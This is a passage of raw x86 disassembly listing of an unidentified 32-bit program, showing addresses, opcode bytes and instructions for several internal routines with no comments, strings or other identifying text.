  402f83:	e8 38 ab 00 00       	call   0x40dac0
  402f88:	5a                   	pop    %edx
  402f89:	50                   	push   %eax
  402f8a:	52                   	push   %edx
  402f8b:	e8 d0 ac 00 00       	call   0x40dc60
  402f90:	58                   	pop    %eax
  402f91:	50                   	push   %eax
  402f92:	e8 d9 21 00 00       	call   0x405170
  402f97:	5a                   	pop    %edx
  402f98:	01 d0                	add    %edx,%eax
  402f9a:	eb 0a                	jmp    0x402fa6
  402f9c:	e8 4f ad 00 00       	call   0x40dcf0
  402fa1:	66 c7 00 00 00       	movw   $0x0,(%eax)
  402fa6:	ff 34 24             	push   (%esp)
  402fa9:	e8 e2 ab 00 00       	call   0x40db90
  402fae:	ff 74 24 08          	push   0x8(%esp)
  402fb2:	e8 d9 ab 00 00       	call   0x40db90
  402fb7:	83 c4 0c             	add    $0xc,%esp
  402fba:	c2 04 00             	ret    $0x4
  402fbd:	53                   	push   %ebx
  402fbe:	31 c0                	xor    %eax,%eax
  402fc0:	50                   	push   %eax
  402fc1:	50                   	push   %eax
  402fc2:	50                   	push   %eax
  402fc3:	50                   	push   %eax
  402fc4:	50                   	push   %eax
  402fc5:	50                   	push   %eax
  402fc6:	e8 35 ac 00 00       	call   0x40dc00
  402fcb:	8b 54 24 20          	mov    0x20(%esp),%edx
  402fcf:	8d 0c 24             	lea    (%esp),%ecx
  402fd2:	e8 89 20 00 00       	call   0x405060
  402fd7:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  402fdb:	83 fb 01             	cmp    $0x1,%ebx
  402fde:	75 24                	jne    0x403004
  402fe0:	52                   	push   %edx
  402fe1:	e8 da aa 00 00       	call   0x40dac0
  402fe6:	5a                   	pop    %edx
  402fe7:	50                   	push   %eax
  402fe8:	52                   	push   %edx
  402fe9:	e8 d2 aa 00 00       	call   0x40dac0
  402fee:	5a                   	pop    %edx
  402fef:	50                   	push   %eax
  402ff0:	8b 44 24 08          	mov    0x8(%esp),%eax
  402ff4:	50                   	push   %eax
  402ff5:	e8 06 68 00 00       	call   0x409800
  402ffa:	8d 44 24 04          	lea    0x4(%esp),%eax
  402ffe:	50                   	push   %eax
  402fff:	e8 fc aa 00 00       	call   0x40db00
  403004:	52                   	push   %edx
  403005:	e8 b6 aa 00 00       	call   0x40dac0
  40300a:	5a                   	pop    %edx
  40300b:	50                   	push   %eax
  40300c:	52                   	push   %edx
  40300d:	e8 ae aa 00 00       	call   0x40dac0
  403012:	5a                   	pop    %edx
  403013:	50                   	push   %eax
  403014:	52                   	push   %edx
  403015:	e8 a6 aa 00 00       	call   0x40dac0
  40301a:	5a                   	pop    %edx
  40301b:	50                   	push   %eax
  40301c:	52                   	push   %edx
  40301d:	e8 9e aa 00 00       	call   0x40dac0
  403022:	5a                   	pop    %edx
  403023:	50                   	push   %eax
  403024:	68 01 00 00 00       	push   $0x1
  403029:	ff 74 24 14          	push   0x14(%esp)
  40302d:	e8 0e 9d 00 00       	call   0x40cd40
  403032:	e8 4b 21 00 00       	call   0x405182
  403037:	01 14 24             	add    %edx,(%esp)
  40303a:	e8 f1 2d 00 00       	call   0x405e30
  40303f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403043:	50                   	push   %eax
  403044:	e8 b7 aa 00 00       	call   0x40db00
  403049:	68 0a 00 00 00       	push   $0xa
  40304e:	ff 74 24 0c          	push   0xc(%esp)
  403052:	ff 35 28 70 41 00    	push   0x417028
  403058:	e8 7f 20 00 00       	call   0x4050dc
  40305d:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403061:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  403066:	0f 84 ac 00 00 00    	je     0x403118
  40306c:	ff 74 24 0c          	push   0xc(%esp)
  403070:	ff 35 28 70 41 00    	push   0x417028
  403076:	e8 e7 f6 ff ff       	call   0x402762
  40307b:	89 44 24 10          	mov    %eax,0x10(%esp)
  40307f:	ff 74 24 10          	push   0x10(%esp)
  403083:	e8 bc 11 00 00       	call   0x404244
  403088:	a3 fc 6f 41 00       	mov    %eax,0x416ffc
  40308d:	ff 35 1c 70 41 00    	push   0x41701c
  403093:	ff 35 fc 6f 41 00    	push   0x416ffc
  403099:	ff 74 24 18          	push   0x18(%esp)
  40309d:	e8 3c e1 ff ff       	call   0x4011de
  4030a2:	52                   	push   %edx
  4030a3:	e8 18 aa 00 00       	call   0x40dac0
  4030a8:	5a                   	pop    %edx
  4030a9:	50                   	push   %eax
  4030aa:	52                   	push   %edx
  4030ab:	e8 10 aa 00 00       	call   0x40dac0
  4030b0:	5a                   	pop    %edx
  4030b1:	50                   	push   %eax
  4030b2:	ff 35 fc 6f 41 00    	push   0x416ffc
  4030b8:	ff 74 24 1c          	push   0x1c(%esp)
  4030bc:	e8 8f 67 00 00       	call   0x409850
  4030c1:	8d 05 00 70 41 00    	lea    0x417000,%eax
  4030c7:	50                   	push   %eax
  4030c8:	e8 33 aa 00 00       	call   0x40db00
  4030cd:	ff 74 24 10          	push   0x10(%esp)
  4030d1:	e8 ea 66 00 00       	call   0x4097c0
  4030d6:	b8 3e 60 41 00       	mov    $0x41603e,%eax
  4030db:	50                   	push   %eax
  4030dc:	ff 35 00 70 41 00    	push   0x417000
  4030e2:	e8 39 28 00 00       	call   0x405920
  4030e7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4030eb:	52                   	push   %edx
  4030ec:	e8 cf a9 00 00       	call   0x40dac0
  4030f1:	5a                   	pop    %edx
  4030f2:	50                   	push   %eax
  4030f3:	52                   	push   %edx
  4030f4:	e8 c7 a9 00 00       	call   0x40dac0
  4030f9:	5a                   	pop    %edx
  4030fa:	50                   	push   %eax
  4030fb:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4030ff:	4b                   	dec    %ebx
  403100:	53                   	push   %ebx
  403101:	ff 35 00 70 41 00    	push   0x417000
  403107:	e8 94 2d 00 00       	call   0x405ea0
  40310c:	8d 05 00 70 41 00    	lea    0x417000,%eax
  403112:	50                   	push   %eax
  403113:	e8 e8 a9 00 00       	call   0x40db00
  403118:	8b 15 00 70 41 00    	mov    0x417000,%edx
  40311e:	31 c9                	xor    %ecx,%ecx
  403120:	e8 fb 1f 00 00       	call   0x405120
  403125:	75 28                	jne    0x40314f
  403127:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  40312b:	83 fb 01             	cmp    $0x1,%ebx
  40312e:	75 17                	jne    0x403147
  403130:	8b 04 24             	mov    (%esp),%eax
  403133:	50                   	push   %eax
  403134:	8d 05 c5 27 40 00    	lea    0x4027c5,%eax
  40313a:	50                   	push   %eax
  40313b:	e8 4c 23 00 00       	call   0x40548c
  403140:	a3 f4 6f 41 00       	mov    %eax,0x416ff4
  403145:	eb 08                	jmp    0x40314f
  403147:	ff 34 24             	push   (%esp)
  40314a:	e8 76 f6 ff ff       	call   0x4027c5
  40314f:	eb 02                	jmp    0x403153
  403151:	31 c0                	xor    %eax,%eax
  403153:	ff 34 24             	push   (%esp)
  403156:	e8 35 aa 00 00       	call   0x40db90
  40315b:	ff 74 24 08          	push   0x8(%esp)
  40315f:	e8 2c aa 00 00       	call   0x40db90
  403164:	83 c4 18             	add    $0x18,%esp
  403167:	5b                   	pop    %ebx
  403168:	c2 04 00             	ret    $0x4
  40316b:	55                   	push   %ebp
  40316c:	e8 8f aa 00 00       	call   0x40dc00
  403171:	ff 35 88 70 41 00    	push   0x417088
  403177:	e8 b8 6f 00 00       	call   0x40a134
  40317c:	52                   	push   %edx
  40317d:	e8 3e a9 00 00       	call   0x40dac0
  403182:	5a                   	pop    %edx
  403183:	50                   	push   %eax
  403184:	52                   	push   %edx
  403185:	e8 36 a9 00 00       	call   0x40dac0
  40318a:	5a                   	pop    %edx
  40318b:	50                   	push   %eax
  40318c:	ff 74 24 18          	push   0x18(%esp)
  403190:	e8 6b 66 00 00       	call   0x409800
  403195:	8b 2d 8c 70 41 00    	mov    0x41708c,%ebp
  40319b:	8d 45 08             	lea    0x8(%ebp),%eax
  40319e:	50                   	push   %eax
  40319f:	e8 5c a9 00 00       	call   0x40db00
  4031a4:	b8 01 00 00 00       	mov    $0x1,%eax
  4031a9:	eb 02                	jmp    0x4031ad
  4031ab:	31 c0                	xor    %eax,%eax
  4031ad:	5d                   	pop    %ebp
  4031ae:	c2 10 00             	ret    $0x10
  4031b1:	31 c0                	xor    %eax,%eax
  4031b3:	50                   	push   %eax
  4031b4:	50                   	push   %eax
  4031b5:	50                   	push   %eax
  4031b6:	50                   	push   %eax
  4031b7:	50                   	push   %eax
  4031b8:	50                   	push   %eax
  4031b9:	e8 42 aa 00 00       	call   0x40dc00
  4031be:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4031c2:	8d 0c 24             	lea    (%esp),%ecx
  4031c5:	e8 96 1e 00 00       	call   0x405060
  4031ca:	68 0a 00 00 00       	push   $0xa
  4031cf:	ff 74 24 04          	push   0x4(%esp)
  4031d3:	ff 35 28 70 41 00    	push   0x417028
  4031d9:	e8 fe 1e 00 00       	call   0x4050dc
  4031de:	89 44 24 04          	mov    %eax,0x4(%esp)
  4031e2:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4031e7:	74 21                	je     0x40320a
  4031e9:	ff 74 24 04          	push   0x4(%esp)
  4031ed:	ff 35 28 70 41 00    	push   0x417028
  4031f3:	e8 6a f5 ff ff       	call   0x402762
  4031f8:	89 44 24 08          	mov    %eax,0x8(%esp)
  4031fc:	ff 74 24 08          	push   0x8(%esp)
  403200:	e8 3f 10 00 00       	call   0x404244
  403205:	a3 fc 6f 41 00       	mov    %eax,0x416ffc
  40320a:	68 00 02 00 00       	push   $0x200
  40320f:	e8 cc 65 00 00       	call   0x4097e0
  403214:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403218:	c7 44 24 10 00 02 00 	movl   $0x200,0x10(%esp)
  40321f:	00 
  403220:	ff 35 fc 6f 41 00    	push   0x416ffc
  403226:	ff 74 24 0c          	push   0xc(%esp)
  40322a:	8d 44 24 18          	lea    0x18(%esp),%eax
  40322e:	50                   	push   %eax
  40322f:	ff 74 24 18          	push   0x18(%esp)
  403233:	e8 88 b1 00 00       	call   0x40e3c0
  403238:	83 c4 10             	add    $0x10,%esp
  40323b:	89 44 24 14          	mov    %eax,0x14(%esp)
  40323f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403243:	eb 02                	jmp    0x403247
  403245:	31 c0                	xor    %eax,%eax
  403247:	ff 34 24             	push   (%esp)
  40324a:	e8 41 a9 00 00       	call   0x40db90
  40324f:	83 c4 18             	add    $0x18,%esp
  403252:	c2 04 00             	ret    $0x4
  403255:	31 c0                	xor    %eax,%eax
  403257:	50                   	push   %eax
  403258:	50                   	push   %eax
  403259:	50                   	push   %eax
  40325a:	50                   	push   %eax
  40325b:	e8 a0 a9 00 00       	call   0x40dc00
  403260:	ff 74 24 18          	push   0x18(%esp)
  403264:	e8 37 1f 00 00       	call   0x4051a0
  403269:	8b 54 24 14          	mov    0x14(%esp),%edx
  40326d:	8d 0c 24             	lea    (%esp),%ecx
  403270:	e8 eb 1d 00 00       	call   0x405060
  403275:	68 0a 00 00 00       	push   $0xa
  40327a:	ff 74 24 04          	push   0x4(%esp)
  40327e:	ff 35 28 70 41 00    	push   0x417028
  403284:	e8 53 1e 00 00       	call   0x4050dc
  403289:	89 44 24 04          	mov    %eax,0x4(%esp)
  40328d:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  403292:	74 6d                	je     0x403301
  403294:	ff 74 24 04          	push   0x4(%esp)
  403298:	ff 35 28 70 41 00    	push   0x417028
  40329e:	e8 bf f4 ff ff       	call   0x402762
  4032a3:	89 44 24 08          	mov    %eax,0x8(%esp)
  4032a7:	ff 74 24 08          	push   0x8(%esp)
  4032ab:	e8 94 0f 00 00       	call   0x404244
  4032b0:	a3 fc 6f 41 00       	mov    %eax,0x416ffc
  4032b5:	ff 35 1c 70 41 00    	push   0x41701c
  4032bb:	ff 35 fc 6f 41 00    	push   0x416ffc
  4032c1:	ff 74 24 10          	push   0x10(%esp)
  4032c5:	e8 14 df ff ff       	call   0x4011de
  4032ca:	52                   	push   %edx
  4032cb:	e8 f0 a7 00 00       	call   0x40dac0
  4032d0:	5a                   	pop    %edx
  4032d1:	50                   	push   %eax
  4032d2:	52                   	push   %edx
  4032d3:	e8 e8 a7 00 00       	call   0x40dac0
  4032d8:	5a                   	pop    %edx
  4032d9:	50                   	push   %eax
  4032da:	68 02 00 00 00       	push   $0x2
  4032df:	ff 35 fc 6f 41 00    	push   0x416ffc
  4032e5:	ff 74 24 18          	push   0x18(%esp)
  4032e9:	e8 02 66 00 00       	call   0x4098f0
  4032ee:	8d 44 24 10          	lea    0x10(%esp),%eax
  4032f2:	50                   	push   %eax
  4032f3:	e8 08 a8 00 00       	call   0x40db00
  4032f8:	ff 74 24 08          	push   0x8(%esp)
  4032fc:	e8 bf 64 00 00       	call   0x4097c0
  403301:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403305:	52                   	push   %edx
  403306:	e8 b5 a7 00 00       	call   0x40dac0
  40330b:	5a                   	pop    %edx
  40330c:	50                   	push   %eax
  40330d:	52                   	push   %edx
  40330e:	e8 4d a9 00 00       	call   0x40dc60
  403313:	58                   	pop    %eax
  403314:	50                   	push   %eax
  403315:	e8 56 1e 00 00       	call   0x405170
  40331a:	5a                   	pop    %edx
  40331b:	01 d0                	add    %edx,%eax
  40331d:	eb 0a                	jmp    0x403329
  40331f:	e8 cc a9 00 00       	call   0x40dcf0
  403324:	66 c7 00 00 00       	movw   $0x0,(%eax)
  403329:	ff 34 24             	push   (%esp)
  40332c:	e8 5f a8 00 00       	call   0x40db90
  403331:	ff 74 24 0c          	push   0xc(%esp)
  403335:	e8 56 a8 00 00       	call   0x40db90
  40333a:	83 c4 10             	add    $0x10,%esp
  40333d:	c2 04 00             	ret    $0x4
  403340:	53                   	push   %ebx
  403341:	31 c0                	xor    %eax,%eax
  403343:	50                   	push   %eax
  403344:	50                   	push   %eax
  403345:	50                   	push   %eax
  403346:	50                   	push   %eax
  403347:	e8 b4 a8 00 00       	call   0x40dc00
  40334c:	ff 74 24 18          	push   0x18(%esp)
  403350:	e8 4b 1e 00 00       	call   0x4051a0
  403355:	b8 80 60 41 00       	mov    $0x416080,%eax
  40335a:	a3 0c 70 41 00       	mov    %eax,0x41700c
  40335f:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403364:	8b 00                	mov    (%eax),%eax
  403366:	89 04 24             	mov    %eax,(%esp)
  403369:	83 05 0c 70 41 00 04 	addl   $0x4,0x41700c
  403370:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403375:	8b 00                	mov    (%eax),%eax
  403377:	89 44 24 04          	mov    %eax,0x4(%esp)
  40337b:	83 05 0c 70 41 00 04 	addl   $0x4,0x41700c
  403382:	ff 34 24             	push   (%esp)
  403385:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403389:	50                   	push   %eax
  40338a:	58                   	pop    %eax
  40338b:	e8 80 1d 00 00       	call   0x405110
  403390:	ff 74 24 04          	push   0x4(%esp)
  403394:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403398:	89 c3                	mov    %eax,%ebx
  40339a:	83 c3 04             	add    $0x4,%ebx
  40339d:	53                   	push   %ebx
  40339e:	58                   	pop    %eax
  40339f:	e8 6c 1d 00 00       	call   0x405110
  4033a4:	52                   	push   %edx
  4033a5:	e8 16 a7 00 00       	call   0x40dac0
  4033aa:	5a                   	pop    %edx
  4033ab:	50                   	push   %eax
  4033ac:	52                   	push   %edx
  4033ad:	e8 0e a7 00 00       	call   0x40dac0
  4033b2:	5a                   	pop    %edx
  4033b3:	50                   	push   %eax
  4033b4:	52                   	push   %edx
  4033b5:	e8 06 a7 00 00       	call   0x40dac0
  4033ba:	5a                   	pop    %edx
  4033bb:	50                   	push   %eax
  4033bc:	52                   	push   %edx
  4033bd:	e8 fe a6 00 00       	call   0x40dac0
  4033c2:	5a                   	pop    %edx
  4033c3:	50                   	push   %eax
  4033c4:	68 01 00 00 00       	push   $0x1
  4033c9:	68 08 00 00 00       	push   $0x8
  4033ce:	8d 44 24 20          	lea    0x20(%esp),%eax
  4033d2:	50                   	push   %eax
  4033d3:	e8 88 99 00 00       	call   0x40cd60
  4033d8:	e8 a5 1d 00 00       	call   0x405182
  4033dd:	01 14 24             	add    %edx,(%esp)
  4033e0:	e8 4b 2a 00 00       	call   0x405e30
  4033e5:	58                   	pop    %eax
  4033e6:	50                   	push   %eax
  4033e7:	e8 84 1d 00 00       	call   0x405170
  4033ec:	5a                   	pop    %edx
  4033ed:	01 d0                	add    %edx,%eax
  4033ef:	eb 0a                	jmp    0x4033fb
  4033f1:	e8 fa a8 00 00       	call   0x40dcf0
  4033f6:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4033fb:	83 c4 10             	add    $0x10,%esp
  4033fe:	5b                   	pop    %ebx
  4033ff:	c3                   	ret
  403400:	53                   	push   %ebx
  403401:	ba 07 00 00 00       	mov    $0x7,%edx
  403406:	83 ec 04             	sub    $0x4,%esp
  403409:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403410:	4a                   	dec    %edx
  403411:	75 f3                	jne    0x403406
  403413:	e8 e8 a7 00 00       	call   0x40dc00
  403418:	ff 74 24 2c          	push   0x2c(%esp)
  40341c:	e8 7f 1d 00 00       	call   0x4051a0
  403421:	8b 54 24 24          	mov    0x24(%esp),%edx
  403425:	8d 0c 24             	lea    (%esp),%ecx
  403428:	e8 33 1c 00 00       	call   0x405060
  40342d:	8b 54 24 28          	mov    0x28(%esp),%edx
  403431:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403435:	e8 26 1c 00 00       	call   0x405060
  40343a:	e8 96 fa ff ff       	call   0x402ed5
  40343f:	21 c0                	and    %eax,%eax
  403441:	74 13                	je     0x403456
  403443:	e8 4c 21 00 00       	call   0x405594
  403448:	89 c3                	mov    %eax,%ebx
  40344a:	83 fb 41             	cmp    $0x41,%ebx
  40344d:	74 07                	je     0x403456
  40344f:	b8 01 00 00 00       	mov    $0x1,%eax
  403454:	eb 02                	jmp    0x403458
  403456:	31 c0                	xor    %eax,%eax
  403458:	21 c0                	and    %eax,%eax
  40345a:	0f 84 66 01 00 00    	je     0x4035c6
  403460:	52                   	push   %edx
  403461:	e8 5a a6 00 00       	call   0x40dac0
  403466:	5a                   	pop    %edx
  403467:	50                   	push   %eax
  403468:	52                   	push   %edx
  403469:	e8 52 a6 00 00       	call   0x40dac0
  40346e:	5a                   	pop    %edx
  40346f:	50                   	push   %eax
  403470:	68 00 08 00 00       	push   $0x800
  403475:	e8 e6 2d 00 00       	call   0x406260
  40347a:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40347e:	50                   	push   %eax
  40347f:	e8 7c a6 00 00       	call   0x40db00
  403484:	68 00 08 00 00       	push   $0x800
  403489:	ff 74 24 0c          	push   0xc(%esp)
  40348d:	e8 5c 1c 00 00       	call   0x4050ee
  403492:	ff 74 24 08          	push   0x8(%esp)
  403496:	e8 c0 1e 00 00       	call   0x40535b
  40349b:	8b 54 24 08          	mov    0x8(%esp),%edx
  40349f:	52                   	push   %edx
  4034a0:	e8 1b a6 00 00       	call   0x40dac0
  4034a5:	5a                   	pop    %edx
  4034a6:	50                   	push   %eax
  4034a7:	52                   	push   %edx
  4034a8:	e8 b3 a7 00 00       	call   0x40dc60
  4034ad:	ba 4c 60 41 00       	mov    $0x41604c,%edx
  4034b2:	52                   	push   %edx
  4034b3:	e8 a8 a7 00 00       	call   0x40dc60
  4034b8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4034bc:	50                   	push   %eax
  4034bd:	e8 3e a6 00 00       	call   0x40db00
  4034c2:	ff 74 24 08          	push   0x8(%esp)
  4034c6:	e8 90 1e 00 00       	call   0x40535b
  4034cb:	8b 54 24 08          	mov    0x8(%esp),%edx
  4034cf:	52                   	push   %edx
  4034d0:	e8 eb a5 00 00       	call   0x40dac0
  4034d5:	5a                   	pop    %edx
  4034d6:	50                   	push   %eax
  4034d7:	52                   	push   %edx
  4034d8:	e8 83 a7 00 00       	call   0x40dc60
  4034dd:	8b 54 24 04          	mov    0x4(%esp),%edx
  4034e1:	52                   	push   %edx
  4034e2:	e8 79 a7 00 00       	call   0x40dc60
  4034e7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4034eb:	50                   	push   %eax
  4034ec:	e8 0f a6 00 00       	call   0x40db00
  4034f1:	8b 54 24 08          	mov    0x8(%esp),%edx
  4034f5:	52                   	push   %edx
  4034f6:	e8 c5 a5 00 00       	call   0x40dac0
  4034fb:	5a                   	pop    %edx
  4034fc:	50                   	push   %eax
  4034fd:	52                   	push   %edx
  4034fe:	e8 5d a7 00 00       	call   0x40dc60
  403503:	8b 54 24 04          	mov    0x4(%esp),%edx
  403507:	52                   	push   %edx
  403508:	e8 53 a7 00 00       	call   0x40dc60
  40350d:	8b 54 24 08          	mov    0x8(%esp),%edx
  403511:	52                   	push   %edx
  403512:	e8 49 a7 00 00       	call   0x40dc60
  403517:	8d 44 24 14          	lea    0x14(%esp),%eax
  40351b:	50                   	push   %eax
  40351c:	e8 df a5 00 00       	call   0x40db00
  403521:	ff 74 24 0c          	push   0xc(%esp)
  403525:	68 00 00 00 00       	push   $0x0
  40352a:	e8 d1 74 00 00       	call   0x40aa00
  40352f:	21 c0                	and    %eax,%eax
  403531:	74 14                	je     0x403547
  403533:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  40353a:	00 
  40353b:	68 00 00 00 00       	push   $0x0
  403540:	e8 cb 70 00 00       	call   0x40a610
  403545:	eb 08                	jmp    0x40354f
  403547:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40354e:	00 
  40354f:	ff 74 24 10          	push   0x10(%esp)
  403553:	68 00 00 00 00       	push   $0x0
  403558:	e8 a3 74 00 00       	call   0x40aa00
  40355d:	21 c0                	and    %eax,%eax
  40355f:	74 14                	je     0x403575
  403561:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  403568:	00 
  403569:	68 00 00 00 00       	push   $0x0
  40356e:	e8 9d 70 00 00       	call   0x40a610
  403573:	eb 08                	jmp    0x40357d
  403575:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40357c:	00 
  40357d:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403581:	03 5c 24 18          	add    0x18(%esp),%ebx
  403585:	21 db                	and    %ebx,%ebx
  403587:	75 3b                	jne    0x4035c4
  403589:	52                   	push   %edx
  40358a:	e8 31 a5 00 00       	call   0x40dac0
  40358f:	5a                   	pop    %edx
  403590:	50                   	push   %eax
  403591:	52                   	push   %edx
  403592:	e8 29 a5 00 00       	call   0x40dac0
  403597:	5a                   	pop    %edx
  403598:	50                   	push   %eax
  403599:	68 00 08 00 00       	push   $0x800
  40359e:	e8 bd 2c 00 00       	call   0x406260
  4035a3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4035a7:	50                   	push   %eax
  4035a8:	e8 53 a5 00 00       	call   0x40db00
  4035ad:	68 00 08 00 00       	push   $0x800
  4035b2:	ff 74 24 0c          	push   0xc(%esp)
  4035b6:	e8 39 1b 00 00       	call   0x4050f4
  4035bb:	ff 74 24 08          	push   0x8(%esp)
  4035bf:	e8 97 1d 00 00       	call   0x40535b
  4035c4:	eb 3b                	jmp    0x403601
  4035c6:	52                   	push   %edx
  4035c7:	e8 f4 a4 00 00       	call   0x40dac0
  4035cc:	5a                   	pop    %edx
  4035cd:	50                   	push   %eax
  4035ce:	52                   	push   %edx
  4035cf:	e8 ec a4 00 00       	call   0x40dac0
  4035d4:	5a                   	pop    %edx
  4035d5:	50                   	push   %eax
  4035d6:	68 00 08 00 00       	push   $0x800
  4035db:	e8 80 2c 00 00       	call   0x406260
  4035e0:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4035e4:	50                   	push   %eax
  4035e5:	e8 16 a5 00 00       	call   0x40db00
  4035ea:	68 00 08 00 00       	push   $0x800
  4035ef:	ff 74 24 0c          	push   0xc(%esp)
  4035f3:	e8 fc 1a 00 00       	call   0x4050f4
  4035f8:	ff 74 24 08          	push   0x8(%esp)
  4035fc:	e8 5a 1d 00 00       	call   0x40535b
  403601:	8b 54 24 08          	mov    0x8(%esp),%edx
  403605:	52                   	push   %edx
  403606:	e8 b5 a4 00 00       	call   0x40dac0
  40360b:	5a                   	pop    %edx
  40360c:	50                   	push   %eax
  40360d:	52                   	push   %edx
  40360e:	e8 4d a6 00 00       	call   0x40dc60
  403613:	58                   	pop    %eax
  403614:	50                   	push   %eax
  403615:	e8 56 1b 00 00       	call   0x405170
  40361a:	5a                   	pop    %edx
  40361b:	01 d0                	add    %edx,%eax
  40361d:	eb 0a                	jmp    0x403629
  40361f:	e8 cc a6 00 00       	call   0x40dcf0
  403624:	66 c7 00 00 00       	movw   $0x0,(%eax)
  403629:	ff 74 24 10          	push   0x10(%esp)
  40362d:	e8 5e a5 00 00       	call   0x40db90
  403632:	ff 34 24             	push   (%esp)
  403635:	e8 56 a5 00 00       	call   0x40db90
  40363a:	ff 74 24 04          	push   0x4(%esp)
  40363e:	e8 4d a5 00 00       	call   0x40db90
  403643:	ff 74 24 08          	push   0x8(%esp)
  403647:	e8 44 a5 00 00       	call   0x40db90
  40364c:	ff 74 24 0c          	push   0xc(%esp)
  403650:	e8 3b a5 00 00       	call   0x40db90
  403655:	83 c4 1c             	add    $0x1c,%esp
  403658:	5b                   	pop    %ebx
  403659:	c2 08 00             	ret    $0x8
  40365c:	55                   	push   %ebp
  40365d:	53                   	push   %ebx
  40365e:	31 c0                	xor    %eax,%eax
  403660:	50                   	push   %eax
  403661:	e8 9a a5 00 00       	call   0x40dc00
  403666:	8b 1d 08 70 41 00    	mov    0x417008,%ebx
  40366c:	83 fb 01             	cmp    $0x1,%ebx
  40366f:	0f 85 94 00 00 00    	jne    0x403709
  403675:	ff 35 80 70 41 00    	push   0x417080
  40367b:	e8 03 6a 00 00       	call   0x40a083
  403680:	89 c3                	mov    %eax,%ebx
  403682:	21 db                	and    %ebx,%ebx
  403684:	7e 2a                	jle    0x4036b0
  403686:	ff 35 80 70 41 00    	push   0x417080
  40368c:	e8 fc 69 00 00       	call   0x40a08d
  403691:	ff 35 80 70 41 00    	push   0x417080
  403697:	e8 06 6a 00 00       	call   0x40a0a2
  40369c:	09 c0                	or     %eax,%eax
  40369e:	74 10                	je     0x4036b0
  4036a0:	8b 2d 84 70 41 00    	mov    0x417084,%ebp
  4036a6:	ff 75 08             	push   0x8(%ebp)
  4036a9:	e8 16 6d 00 00       	call   0x40a3c4
  4036ae:	eb e1                	jmp    0x403691
  4036b0:	ff 35 78 70 41 00    	push   0x417078
  4036b6:	e8 c8 69 00 00       	call   0x40a083
  4036bb:	89 04 24             	mov    %eax,(%esp)
  4036be:	8b 1c 24             	mov    (%esp),%ebx
  4036c1:	21 db                	and    %ebx,%ebx
  4036c3:	7e 44                	jle    0x403709
  4036c5:	68 05 00 00 00       	push   $0x5
  4036ca:	68 00 00 00 00       	push   $0x0
  4036cf:	68 01 00 00 00       	push   $0x1
  4036d4:	ff 35 78 70 41 00    	push   0x417078
  4036da:	e8 11 35 00 00       	call   0x406bf0
  4036df:	ff 35 78 70 41 00    	push   0x417078
  4036e5:	e8 a3 69 00 00       	call   0x40a08d
  4036ea:	ff 35 78 70 41 00    	push   0x417078
  4036f0:	e8 ad 69 00 00       	call   0x40a0a2
  4036f5:	09 c0                	or     %eax,%eax
  4036f7:	74 10                	je     0x403709
  4036f9:	8b 2d 7c 70 41 00    	mov    0x41707c,%ebp
  4036ff:	ff 75 0c             	push   0xc(%ebp)
  403702:	e8 a5 19 00 00       	call   0x4050ac
  403707:	eb e1                	jmp    0x4036ea
  403709:	b8 01 00 00 00       	mov    $0x1,%eax
  40370e:	eb 02                	jmp    0x403712
  403710:	31 c0                	xor    %eax,%eax
  403712:	83 c4 04             	add    $0x4,%esp
  403715:	5b                   	pop    %ebx
  403716:	5d                   	pop    %ebp
  403717:	c3                   	ret
  403718:	53                   	push   %ebx
  403719:	31 c0                	xor    %eax,%eax
  40371b:	50                   	push   %eax
  40371c:	50                   	push   %eax
  40371d:	e8 de a4 00 00       	call   0x40dc00
  403722:	ff 74 24 18          	push   0x18(%esp)
  403726:	e8 75 1a 00 00       	call   0x4051a0
  40372b:	8b 54 24 14          	mov    0x14(%esp),%edx
  40372f:	8d 0c 24             	lea    (%esp),%ecx
  403732:	e8 29 19 00 00       	call   0x405060
  403737:	ff 74 24 10          	push   0x10(%esp)
  40373b:	31 db                	xor    %ebx,%ebx
  40373d:	3b 1c 24             	cmp    (%esp),%ebx
  403740:	75 24                	jne    0x403766
  403742:	52                   	push   %edx
  403743:	e8 78 a3 00 00       	call   0x40dac0
  403748:	5a                   	pop    %edx
  403749:	50                   	push   %eax
  40374a:	52                   	push   %edx
  40374b:	e8 70 a3 00 00       	call   0x40dac0
  403750:	5a                   	pop    %edx
  403751:	50                   	push   %eax
  403752:	e8 de 6c 00 00       	call   0x40a435
  403757:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40375b:	50                   	push   %eax
  40375c:	e8 9f a3 00 00       	call   0x40db00
  403761:	e9 39 02 00 00       	jmp    0x40399f
  403766:	bb 01 00 00 00       	mov    $0x1,%ebx
  40376b:	3b 1c 24             	cmp    (%esp),%ebx
  40376e:	75 23                	jne    0x403793
  403770:	8b 15 48 70 41 00    	mov    0x417048,%edx
  403776:	52                   	push   %edx
  403777:	e8 44 a3 00 00       	call   0x40dac0
  40377c:	5a                   	pop    %edx
  40377d:	50                   	push   %eax
  40377e:	52                   	push   %edx
  40377f:	e8 dc a4 00 00       	call   0x40dc60
